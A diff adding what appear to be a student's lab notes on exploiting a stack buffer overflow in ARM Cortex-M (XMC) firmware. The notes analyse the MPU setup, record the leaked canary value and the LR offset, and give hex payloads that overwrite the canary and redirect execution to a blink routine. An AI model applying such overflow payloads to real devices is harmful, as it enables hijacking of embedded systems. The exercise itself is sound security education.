@@ -1,0 +1,121 @@
+MPU is active, but in mode rw -rw, it means that now we cannot execute anymore, BUT we still can overwrite the LR, and thus inject a different adress in an UNprotected region (below 10000000)
+f.e. we could move to 0x80002e0 and execute  
+blinkCode ^= BLINKENLIGHTS; 
+blink(blinkCode); 
+
+&lr = 0x100007bc
+&buf = 10000724
+Delta = 152B
+
+First of all we have to understand how the MPU is set up.
+By looking at register &0xE000ED94, we see that 0x05 means:
+-MPU enabled
+-PRIVDEFNA enabled (Privileged software access to default mem map [XMC Manual: 2-95])
+
+region 1 of MPU is enabled (MPU_RBR: &0xE000ED9C), and the selected region is the max, 4GB (MPU_RASR: &0xE000EDA0)
+
+we can confirm by looking at line 403 in main.lst:
+
+
+  /* Secretly activate MPU without calling any function with telltale name */
+  MPUconfig_t Stack = \
+ 80003c8:	4a08      	ldr	r2, [pc, #32]	; (80003ec <SystemCoreClockSetup+0x88>)
+ 80003ca:	466b      	mov	r3, sp
+ 80003cc:	ca07      	ldmia	r2, {r0, r1, r2}
+ 80003ce:	e883 0007 	stmia.w	r3, {r0, r1, r2}
+    {.baseAddress=(void *) 0x10000000, .size=16, .priority=1, \
+     .permissions=MPUeasyENABLEREGION | MPUeasyXN | MPUeasy_RW_RW};
+  configMPU(Stack);
+
+  Code is enabling MPU starting from base adress 0x10000000 (STACK) and with the max = 4GB, with priority/region = 1.
+  -MPUeasyXN disables execution, MPUeasy_RW_RW enables RW both in Privileged and Unprivileged mode
+
+
+blink defined in 0x08000b7c
+to trigger blinking, blinkCode = 0xdeadbeef
+blick param of function is defined at = 0x8000b7c
+noButton adress = 0x2000ff3c
+
+to trigger just set register for GPIO IN = 1
+
+
+DMA Settings (Line 3438):
+    /* Programm dma address if needed */
+    xmc_device.endpoint_out_register[ep->address_u.address_st.number]->doepdma = (uint32_t)(ep->xferBuffer);
+ 80014e0:	7803      	ldrb	r3, [r0, #0]
+ 80014e2:	f003 020f 	and.w	r2, r3, #15
+ 80014e6:	4b1a      	ldr	r3, [pc, #104]	; (8001550 <XMC_USBD_lStartReadXfer+0xa8>)
+ 80014e8:	eb03 0382 	add.w	r3, r3, r2, lsl #2
+ 80014ec:	f8d3 31c4 	ldr.w	r3, [r3, #452]	; 0x1c4
+ 80014f0:	6a42      	ldr	r2, [r0, #36]	; 0x24
+ 80014f2:	615a      	str	r2, [r3, #20]
+  }
+
+(Line 35566)
+     /* Program dma*/
+     xmc_device.endpoint_in_register[ep->address_u.address_st.number]->diepdma = (uint32_t)ep->xferBuffer;
+80015a0:	7804      	ldrb	r4, [r0, #0]
+80015a2:	f004 040f 	and.w	r4, r4, #15
+80015a6:	346a      	adds	r4, #106	; 0x6a
+80015a8:	4d1e      	ldr	r5, [pc, #120]	; (8001624 <XMC_USBD_lStartWriteXfer+0xd0>)
+80015aa:	f855 4024 	ldr.w	r4, [r5, r4, lsl #2]
+80015ae:	6a45      	ldr	r5, [r0, #36]	; 0x24
+80015b0:	6165      	str	r5, [r4, #20]
+   }
+
+
+
+
+Canary value is: 0x23d58132, placed exactly after 132 B of buf (check with x/136xb buf)
+
+0x42	0x42	0x42	0x42	0x42	0x42	0x42	0x42
+0x42	0x42	0x42	0x42	0x42	0x42	0x42	0x42
+0x42	0x42	0x76	0x14	0x43	0x42	0x42	0x42
+0x7d	0x52	0x42	0x4a	0x42	0x42	0x42	0x42
+0xa1	0x53	0x42	0x4a	0xdb	0x53	0x42	0x4a
+0x42	0x42	0x42	0x42	0x42	0x42	0x42	0x42
+0x4a	0x42	0x42	0x42	0xba	0x4e	0x42	0x62
+0xcf	0x61	0x42	0x4a	0xd2	0x45	0x42	0x52
+0x4a	0x42	0x42	0x42	0x4d	0x42	0x42	0x42
+0x52	0x42	0x4a	0x02	0x42	0x42	0x42	0x42
+0xd2	0x40	0x42	0x4a	0x8a	0x45	0x42	0x52
+0x9e	0x45	0x42	0x52	0x42	0x42	0x42	0x42
+0xad	0xfc	0xef	0x9c	0x46	0x42	0x42	0x4e
+0x42	0x42	0x42	0x42	0x42	0x42	0x42	0x42
+0x47	0x46	0x42	0x4a	0x82	0x4d	0x42	0x62
+0xbb	0xbd	0xbd	0xbd	0x8a	0x45	0x42	0x52
+0x32	0x81	0xd5	0x23	0x14	0x00	0x00	0x00
+
+so by writing:
+12 34 56 bd bd bd bd bd bd bd bd bd bd bd bd bd
+12 34 56 bd bd bd bd bd bd bd bd bd bd bd bd bd
+12 34 56 bd bd bd bd bd bd bd bd bd bd bd bd bd
+12 34 56 bd bd bd bd bd bd bd bd bd bd bd bd bd
+12 34 56 bd bd bd bd bd bd bd bd bd bd bd bd bd
+12 34 56 bd bd bd bd bd bd bd bd bd bd bd bd bd
+12 34 56 bd bd bd bd bd bd bd bd bd bd bd bd bd
+12 34 56 bd bd bd bd bd bd bd bd bd bd bd bd bd
+32 81 D5 23
+
+we will overwrite the canary and code works (checked)
+
+return parameters of encrypt function is:
+lr = 0x100007bc
+-> 152 Bytes difference
+
+following will allow to overwrite canary, and then jump to blink:
+bd bd bd bd bd bd bd bd bd bd bd bd bd bd bd bd
+bd bd bd bd bd bd bd bd bd bd bd bd bd bd bd bd
+bd bd bd bd bd bd bd bd bd bd bd bd bd bd bd bd
+bd bd bd bd bd bd bd bd bd bd bd bd bd bd bd bd
+bd bd bd bd bd bd bd bd bd bd bd bd bd bd bd bd
+bd bd bd bd bd bd bd bd bd bd bd bd bd bd bd bd
+bd bd bd bd bd bd bd bd bd bd bd bd bd bd bd bd
+bd bd bd bd bd bd bd bd bd bd bd bd bd bd bd bd
+32 81 D5 23 80 00 00 00 90	02	00	08	c8	07	00	10
+dc	07	00	10 00 00 00 00 4b 03 00 08  
+
+32	81	d5	23	80	00	00	00 90	02	00	08	c8	07	00	10
+dc	07	00	10	00	00	00	00
+
+now only missing to continue task
